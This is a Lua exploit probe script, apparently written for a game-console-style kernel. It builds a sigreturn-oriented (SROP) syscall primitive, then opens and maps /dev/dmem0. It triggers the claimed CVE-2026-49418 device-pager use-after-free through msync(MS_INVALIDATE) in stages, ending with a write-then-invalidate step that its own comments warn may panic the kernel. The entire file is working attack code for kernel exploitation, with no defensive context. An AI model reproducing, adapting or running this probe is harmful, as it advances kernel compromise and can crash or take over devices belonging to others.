-- CRASH_CLASS: HIGH
-- PROBE 161a: msync(MS_INVALIDATE) on dmem0 device-backed mapping
--
-- CVE-2026-49418: device pager UAF triggered by msync(MS_INVALIDATE)
-- on device-backed mappings. GPU anon mmap returns -1 (58a confirmed).
-- dmem0 is a real device mapping that may hit the vulnerable code path.
-- DEM9N101 reported: write + msync(MS_INVALIDATE) on dmem0 = kernel panic.
--
-- This probe tests msync(MS_INVALIDATE) incrementally:
-- A) Map dmem0 PROT_READ, msync without write (safest)
-- B) Map dmem0 PROT_READ|PROT_WRITE, msync without write
-- C) Map dmem0 PROT_READ|PROT_WRITE, write, then msync (CVE trigger)

print("=== PROBE 161a: DMEM0 MSYNC INVALIDATE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local PAGE = 0x4000

-- [A] Open /dev/dmem0
print("--- [A] OPEN DMEM0 ---")
local name_off = 0x10000
local nm = "/dev/dmem0"
for i = 1, #nm do wd(gpu + name_off + i - 1, string.byte(nm, i)) end
wd(gpu + name_off + #nm, 0)

local dmem_fd = srop(5, ga(name_off), uint64(2), uint64(0))
local dmemv = dmem_fd and to_num(dmem_fd) or -1
print("dmem0_fd=" .. dmemv)

if dmemv < 0 or dmemv > 0xFFFF then
    print("dmem0 open failed")
    print("=== DONE ===")
    return
end

-- [B] Map dmem0 PROT_READ only, test msync(MS_INVALIDATE)
print("")
print("--- [B] DMEM0 MAP PROT_READ + MSYNC ---")

local map1 = srop(477, uint64(0), uint64(PAGE), uint64(1),
    uint64(1), uint64(dmemv), uint64(0))
local m1h, m1l = get_hi_lo(map1)
print("dmem0_map_RO=0x" .. string.format("%X%08X", m1h, m1l))

if m1h == 0xFFFFFFFF then
    print("dmem0 PROT_READ map failed, trying PROT_READ|PROT_WRITE")
else
    local ok, val = pcall(function() return memory.read_dword(map1) end)
    if ok then
        print("dmem0_read=0x" .. string.format("%08X", to_num(val)))
    else
        print("dmem0_read=FAULT")
    end

    local ms1 = srop(65, map1, uint64(PAGE), uint64(2))
    local ms1v = ms1 and to_num(ms1) or -999
    print("msync(PROT_READ,MS_INVALIDATE)=" .. ms1v)

    if ms1v == 0 then
        print("*** MS_INVALIDATE RETURNED 0 ON DMEM0 READ-ONLY! ***")
        local ok2, val2 = pcall(function() return memory.read_dword(map1) end)
        if ok2 then
            print("post_inv_read=0x" .. string.format("%08X", to_num(val2)))
        else
            print("post_inv_read=FAULT (pages freed!)")
            print("*** CVE-2026-49418 PAGE REMOVAL CONFIRMED ***")
        end
    end

    srop(73, map1, uint64(PAGE))
end

-- [C] Map dmem0 PROT_READ|PROT_WRITE, test msync without write
print("")
print("--- [C] DMEM0 MAP PROT_RW + MSYNC (NO WRITE) ---")

local map2 = srop(477, uint64(0), uint64(PAGE), uint64(3),
    uint64(1), uint64(dmemv), uint64(0))
local m2h, m2l = get_hi_lo(map2)
print("dmem0_map_RW=0x" .. string.format("%X%08X", m2h, m2l))

if m2h == 0xFFFFFFFF then
    print("dmem0 PROT_RW map failed")
else
    local ok, val = pcall(function() return memory.read_dword(map2) end)
    if ok then
        print("dmem0_rw_read=0x" .. string.format("%08X", to_num(val)))
    else
        print("dmem0_rw_read=FAULT")
    end

    local ms2 = srop(65, map2, uint64(PAGE), uint64(2))
    local ms2v = ms2 and to_num(ms2) or -999
    print("msync(PROT_RW,nowrite,MS_INVALIDATE)=" .. ms2v)

    if ms2v == 0 then
        print("*** MS_INVALIDATE RETURNED 0 ON DMEM0 RW NO-WRITE! ***")
        local ok2, val2 = pcall(function() return memory.read_dword(map2) end)
        if ok2 then
            print("post_inv_read=0x" .. string.format("%08X", to_num(val2)))
        else
            print("post_inv_read=FAULT (pages freed!)")
            print("*** CVE-2026-49418 PAGE REMOVAL CONFIRMED ***")
        end
    end

    srop(73, map2, uint64(PAGE))
end

print("")
print("pid_check=" .. tostring(to_num(make_syscall(20)())))

-- [D] Map dmem0 PROT_RW, WRITE, then msync (DANGER: may kernel panic)
print("")
print("--- [D] DMEM0 MAP+WRITE+MSYNC (CVE TRIGGER) ---")
print("*** WARNING: DEM9N101 reported kernel panic from this path ***")

local map3 = srop(477, uint64(0), uint64(PAGE), uint64(3),
    uint64(1), uint64(dmemv), uint64(0))
local m3h, m3l = get_hi_lo(map3)
print("dmem0_map_RW2=0x" .. string.format("%X%08X", m3h, m3l))

if m3h == 0xFFFFFFFF then
    print("dmem0 map for write test failed")
else
    local wok = pcall(function() memory.write_dword(map3, 0xDEADBEEF) end)
    print("dmem0_write=" .. (wok and "OK" or "FAIL"))

    if wok then
        print("TRIGGERING msync(MS_INVALIDATE) after write...")
        local ms3 = srop(65, map3, uint64(PAGE), uint64(2))
        local ms3v = ms3 and to_num(ms3) or -999
        print("msync(PROT_RW,written,MS_INVALIDATE)=" .. ms3v)

        if ms3v == 0 then
            print("*** CVE-2026-49418 TRIGGER SURVIVED! ***")
            local ok3, val3 = pcall(function() return memory.read_dword(map3) end)
            if ok3 then
                print("post_write_inv_read=0x" .. string.format("%08X", to_num(val3)))
                if to_num(val3) ~= 0xDEADBEEF then
                    print("*** DATA CHANGED: possible page reuse ***")
                end
            else
                print("post_write_inv_read=FAULT")
                print("*** PAGES FREED AFTER WRITE+INVALIDATE ***")
            end
        elseif ms3v == -1 then
            print("msync rejected (same as GPU mmap)")
        end
    end

    pcall(function() srop(73, map3, uint64(PAGE)) end)
end

srop(6, uint64(dmemv))
print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
